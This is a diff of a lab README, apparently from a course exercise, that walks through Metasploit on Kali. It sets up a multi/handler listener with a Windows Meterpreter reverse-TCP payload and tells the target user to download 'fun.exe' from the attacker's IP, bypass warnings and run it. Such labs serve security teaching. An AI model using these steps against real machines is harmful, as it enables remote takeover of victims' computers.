@@ -43,6 +43,7 @@ Start apache server sudo systemctl apache2 start
 
 Check the status of apache2 sudo apache2 status
 ![Screenshot 2024-10-28 155537](https://github.com/user-attachments/assets/89f10144-5cf5-4b0e-b5e5-f81d538535b0)
+
 Invoke msfconsole:
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
@@ -50,6 +51,7 @@ Type help or a question mark "?" to see the list of all available commands you c
 Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
 ## Output
 ![374867868-108c6d73-63fc-415b-8b5d-5ddbeb7bdfb7](https://github.com/user-attachments/assets/c4b090c0-89b8-4b83-8999-b3010fbf9949)
+
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads. 
 ![374867924-2d3c9bbd-30bf-4db7-8957-4760d26234a1](https://github.com/user-attachments/assets/fd6cf4ad-9f48-4976-92a6-39e92e09cad9)
 Bypass any warning boxes, double-click the file, and allow it to run. On kali give the command exploit 
